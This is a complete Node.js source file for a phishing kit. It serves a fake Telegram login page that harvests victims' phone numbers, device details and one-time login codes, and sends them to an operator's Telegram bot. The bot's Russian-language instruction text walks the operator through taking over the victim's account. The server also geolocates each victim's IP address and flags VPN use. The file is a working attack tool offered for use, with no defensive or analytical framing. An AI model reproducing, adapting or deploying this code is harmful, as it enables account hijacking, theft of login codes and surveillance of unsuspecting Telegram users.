// ==== file: index.js ====
// language: JavaScript, target: Node.js 20 (Render)
import express from 'express';
import TelegramBot from 'node-telegram-bot-api';

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

if (!BOT_TOKEN || !ADMIN_CHAT_ID) process.exit(1);

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();
app.use(express.json());

// Хранилище истории (в памяти)
let history = [];

// --- БОТ: КОМАНДЫ И КНОПКИ ---
bot.onText(/^\/start$/, (msg) => {
  const opts = {
    reply_markup: {
      inline_keyboard: [
        [{ text: '📜 История захватов', callback_data: 'hist' }],
        [{ text: '📖 Инструкция', callback_data: 'instr' }],
        [{ text: '🌐 Открыть сайт', url: 'https://tg-sms-2.onrender.com' }]
      ]
    }
  };
  bot.sendMessage(msg.chat.id, `🛡 <b>Панель управления</b>\n\nВыбери действие:`, { parse_mode: 'HTML', ...opts });
});

bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  bot.answerCallbackQuery(query.id);

  if (query.data === 'instr') {
    bot.sendMessage(chatId, `📖 <b>ИНСТРУКЦИЯ</b>\n\n1. Скинь жертве ссылку.\n2. Она вводит номер.\n3. Ты вводишь её номер в свой Telegram.\n4. Жертве приходит СМС. Она вводит код на сайте.\n5. Тебе в бот летит код. Ты вводишь его в Telegram и забираешь аккаунт.`, { parse_mode: 'HTML' });
  }

  if (query.data === 'hist') {
    if (history.length === 0) return bot.sendMessage(chatId, '📜 История пуста.');
    const text = history.slice(0, 10).map((h, i) => `${i + 1}. <code>${h.phone}</code> | Код: <code>${h.code}</code>`).join('\n');
    bot.sendMessage(chatId, `📜 <b>Последние 10 целей:</b>\n\n${text}`, { parse_mode: 'HTML' });
  }
});

// Утилита отправки
async function sendToAdmin(text) {
  try {
    await bot.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'HTML' });
  } catch (e) {}
}

// --- API ---
app.post('/api/request', async (req, res) => {
  const { phone, ua, screen, battery } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  if (!phone || phone.length < 8) return res.status(400).json({ ok: false });

  // Улучшенное определение устройства
  let device = "Android (Неизвестно)";
  if (ua.includes("iPhone")) device = "Apple iPhone";
  else if (ua.includes("Samsung")) device = "Samsung Galaxy";
  else if (ua.includes("Redmi") || ua.includes("Xiaomi")) device = "Xiaomi Redmi";
  else if (ua.includes("Windows")) device = "Windows PC";
  else if (ua.includes("Mac OS")) device = "Apple Mac";
  else {
    // Пытаемся вытащить модель из строки Android (например: Android 10; K)
    const match = ua.match(/Android\s[0-9.]+;\s([^)]+)/);
    if (match && match[1]) device = match[1].trim(); // Вернет, например, "Redmi 14C" или "23021RAA2Y"
  }

  // IP Инфо
  let ipInfo = "Неизвестно";
  let isVpn = false;
  try {
    const r = await fetch(`http://ip-api.com/json/${ip.split(',')[0]}?fields=country,city,isp,proxy,hosting`);
    const d = await r.json();
    if (d.country) {
      ipInfo = `${d.country}, ${d.city} (${d.isp})`;
      if (d.proxy || d.hosting) isVpn = true;
    }
  } catch (e) {}

  const msg = `🎯 <b>НОВАЯ ЦЕЛЬ</b>\n\n` +
              `📱 <b>Номер:</b> <code>${phone}</code>\n` +
              `💻 <b>Модель:</b> ${device}\n` +
              `🖥 <b>Экран:</b> ${screen || 'Неизвестно'}\n` +
              `🔋 <b>Батарея:</b> ${battery || 'Скрыто'}\n` +
              `🌐 <b>IP:</b> <code>${ip.split(',')[0]}</code>\n` +
              `📍 <b>Локация:</b> ${ipInfo}\n` +
              (isVpn ? `⚠️ <b>VPN/Proxy!</b>\n` : ``) +
              `🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;

  await sendToAdmin(msg);
  res.json({ ok: true });
});

app.post('/api/code', async (req, res) => {
  const { phone, code } = req.body;
  
  history.unshift({ phone, code });
  if (history.length > 20) history.pop();

  await sendToAdmin(`😈 <b>ПЕРЕХВАТ КОДА</b>\n\n📱 <code>${phone}</code>\n🔑 <b>КОД:</b> <code>${code}</code>\n\n🏃‍♂️ <i>БЕГИ В TELEGRAM!</i>`);
  res.json({ ok: true });
});

app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Telegram</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
  body { background: #17212b; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; user-select: none; }
  .app { width: 100%; max-width: 420px; height: 100vh; background: #17212b; display: flex; flex-direction: column; position: relative; }
  .top-bar { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; font-size: 15px; color: #2aabee; font-weight: 500; }
  .top-bar .time { color: #fff; font-weight: 600; }
  .header { padding: 20px; text-align: center; }
  .logo { width: 90px; height: 90px; background: linear-gradient(135deg, #2aabee, #229ed9); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; box-shadow: 0 8px 25px rgba(42, 171, 238, 0.3); }
  .logo svg { width: 55px; height: 55px; fill: #fff; margin-left: 5px; }
  h1 { font-size: 24px; font-weight: 500; margin-bottom: 10px; }
  p.subtitle { font-size: 14px; color: #708499; line-height: 1.5; padding: 0 10px; }
  .form-container { padding: 20px; flex: 1; display: flex; flex-direction: column; }
  .input-group { display: flex; gap: 10px; margin-bottom: 25px; animation: fadeIn 0.3s ease; }
  .country-select { width: 110px; background: #0e1621; border: 1px solid #2b5278; border-radius: 10px; color: #fff; padding: 0 10px; font-size: 16px; outline: none; appearance: none; }
  .input-phone { flex: 1; background: #0e1621; border: 1px solid #2b5278; border-radius: 10px; color: #fff; padding: 16px; font-size: 17px; outline: none; transition: border-color 0.2s; }
  .input-phone:focus { border-color: #2aabee; }
  .btn { background: #2aabee; color: #fff; border: none; border-radius: 10px; padding: 16px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; width: 100%; display: flex; justify-content: center; align-items: center; }
  .btn:active { background: #229ed9; }
  .hidden { display: none !important; }
  .spinner { display: inline-block; width: 20px; height: 20px; border: 2.5px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 0.8s linear infinite; margin-right: 10px; }
  @keyframes spin { to { transform: rotate(360deg); } }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  .code-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; animation: fadeIn 0.3s ease; }
  .code-input { width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 600; background: #0e1621; border: 1.5px solid #2b5278; border-radius: 10px; color: #fff; outline: none; transition: border-color 0.2s; }
  .code-input:focus { border-color: #2aabee; }
</style>
</head>
<body>
<div class="app">
  <div class="top-bar">
    <span id="clock"></span>
    <span>Отмена</span>
  </div>
  <div class="header">
    <div class="logo">
      <svg viewBox="0 0 24 24"><path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.295-.6.295-.002 0-.003 0-.005 0l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.64-.203-.658-.64.135-.954l11.566-4.458c.538-.196 1.006.128.832.94z"/></svg>
    </div>
    <h1 id="title">Ваш номер</h1>
    <p class="subtitle" id="subtitle">Пожалуйста, подтвердите код страны и ваш номер телефона.</p>
  </div>
  
  <div class="form-container">
    <form id="phoneForm" autocomplete="off">
      <div class="input-group">
        <select class="country-select" id="countryCode">
          <option value="373">🇲🇩 +373</option>
          <option value="7">🇷🇺 +7</option>
          <option value="380">🇺🇦 +380</option>
          <option value="375">🇧🇾 +375</option>
          <option value="1">🇺🇸 +1</option>
          <option value="44">🇬🇧 +44</option>
          <option value="49">🇩🇪 +49</option>
          <option value="33">🇫🇷 +33</option>
        </select>
        <input type="tel" class="input-phone" id="phone" placeholder="69 123 456" required>
      </div>
      <button type="submit" class="btn" id="btnPhone">Далее</button>
    </form>

    <form id="codeForm" class="hidden" autocomplete="off">
      <div class="code-container">
        <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
      </div>
      <button type="submit" class="btn" id="btnCode">Далее</button>
    </form>
  </div>
</div>

<script>
  const phoneForm = document.getElementById('phoneForm');
  const codeForm = document.getElementById('codeForm');
  const btnPhone = document.getElementById('btnPhone');
  const btnCode = document.getElementById('btnCode');
  const countryCode = document.getElementById('countryCode');
  const codeInputs = document.querySelectorAll('.code-input');
  const title = document.getElementById('title');
  const subtitle = document.getElementById('subtitle');
  const phoneInput = document.getElementById('phone');
  const clock = document.getElementById('clock');
  
  let fullPhone = '';

  setInterval(() => {
    const d = new Date();
    clock.textContent = d.getHours().toString().padStart(2, '0') + ':' + d.getMinutes().toString().padStart(2, '0');
  }, 1000);

  phoneInput.addEventListener('input', (e) => {
    let val = e.target.value.replace(/\\D/g, '');
    if (val.length > 9) val = val.slice(0, 9);
    let formatted = val;
    if (val.length > 6) formatted = val.slice(0, 3) + ' ' + val.slice(3, 6) + ' ' + val.slice(6);
    else if (val.length > 3) formatted = val.slice(0, 3) + ' ' + val.slice(3);
    e.target.value = formatted;
  });

  codeInputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
      if (e.target.value.length === 1 && index < 4) codeInputs[index + 1].focus();
    });
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) codeInputs[index - 1].focus();
    });
  });

  phoneForm.onsubmit = async (e) => {
    e.preventDefault();
    const localPhone = phoneInput.value.replace(/\\D/g, '');
    if (localPhone.length < 7) return;
    
    fullPhone = countryCode.value + localPhone;
    btnPhone.innerHTML = '<span class="spinner"></span>Отправка...';
    btnPhone.disabled = true;

    let battery = 'Скрыто';
    try {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        battery = Math.round(b.level * 100) + '%';
      }
    } catch(err) {}

    const info = {
      ua: navigator.userAgent,
      screen: window.screen.width + 'x' + window.screen.height,
      lang: navigator.language,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      battery: battery
    };

    try {
      await fetch('/api/request', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: fullPhone, ...info })
      });
      
      phoneForm.classList.add('hidden');
      codeForm.classList.remove('hidden');
      title.textContent = 'Введите код';
      subtitle.innerHTML = 'Мы отправили код в Telegram на номер <b>+' + fullPhone + '</b>';
      setTimeout(() => codeInputs[0].focus(), 100);
      
    } catch (err) {
      btnPhone.innerHTML = 'Далее';
      btnPhone.disabled = false;
    }
  };

  codeForm.onsubmit = async (e) => {
    e.preventDefault();
    let code = '';
    codeInputs.forEach(i => code += i.value);
    if (code.length < 5) return;

    btnCode.innerHTML = '<span class="spinner"></span>Проверка...';
    btnCode.disabled = true;

    try {
      await fetch('/api/code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: fullPhone, code })
      });
      
      title.textContent = 'Готово';
      subtitle.innerHTML = 'Вы успешно вошли в аккаунт.';
      codeForm.innerHTML = '<div style="text-align:center;font-size:60px;margin-top:20px;animation:fadeIn 0.5s;">✅</div>';
      setTimeout(() => window.location.href = 'https://web.telegram.org', 2000);
      
    } catch (err) {
      btnCode.innerHTML = 'Далее';
      btnCode.disabled = false;
    }
  };
</script>
</body>
</html>`);
});

app.listen(process.env.PORT || 3000);
